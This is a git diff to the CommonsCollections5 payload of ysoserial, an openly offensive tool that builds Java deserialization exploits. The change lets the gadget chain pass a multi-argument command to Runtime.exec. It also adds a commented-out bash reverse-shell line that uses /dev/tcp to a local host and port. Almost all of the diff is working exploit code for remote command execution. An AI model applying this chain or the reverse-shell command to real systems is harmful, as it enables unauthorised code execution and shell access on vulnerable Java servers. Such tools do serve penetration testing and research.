@@ -14,6 +14,7 @@ import org.apache.commons.collections.functors.InvokerTransformer;
 import org.apache.commons.collections.keyvalue.TiedMapEntry;
 import org.apache.commons.collections.map.LazyMap;
 
+import org.python.antlr.ast.Str;
 import ysoserial.payloads.annotation.Authors;
 import ysoserial.payloads.annotation.Dependencies;
 import ysoserial.payloads.annotation.PayloadTest;
@@ -54,8 +55,10 @@ https://github.com/JetBrains/jdk8u_jdk/commit/af2361ee2878302012214299036b3a8b4e
 @Authors({ Authors.MATTHIASKAISER, Authors.JASINNER })
 public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<BadAttributeValueExpException> {
 
-	public BadAttributeValueExpException getObject(final String command) throws Exception {
-		final String[] execArgs = new String[] { command };
+	public BadAttributeValueExpException getObject(final String ... command) throws Exception {
+        final String[] execArgs = command;
+        Class c = execArgs.length > 1 ? String[].class : String.class;
+
 		// inert chain for setup
 		final Transformer transformerChain = new ChainedTransformer(
 		        new Transformer[]{ new ConstantTransformer(1) });
@@ -69,7 +72,7 @@ public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<
 					Object.class, Object[].class }, new Object[] {
 					null, new Object[0] }),
 				new InvokerTransformer("exec",
-					new Class[] { String.class }, execArgs),
+					new Class[] { c }, c == String.class ? execArgs : new Object[] {execArgs}),
 				new ConstantTransformer(1) };
 		final Map innerMap = new HashMap();
 
@@ -87,7 +90,9 @@ public class CommonsCollections5 extends PayloadRunner implements ObjectPayload<
 		return val;
 	}
 
-	public static void main(final String[] args) throws Exception {
+	public static void main(String[] args) throws Exception {
+//	    args = new String[] {"/bin/bash","-c","bash -i 1>& /dev/tcp/127.0.0.1/23232 0>&1"};
+//        PayloadRunner.runDeserialize = true;
 		PayloadRunner.run(CommonsCollections5.class, args);
 	}
 
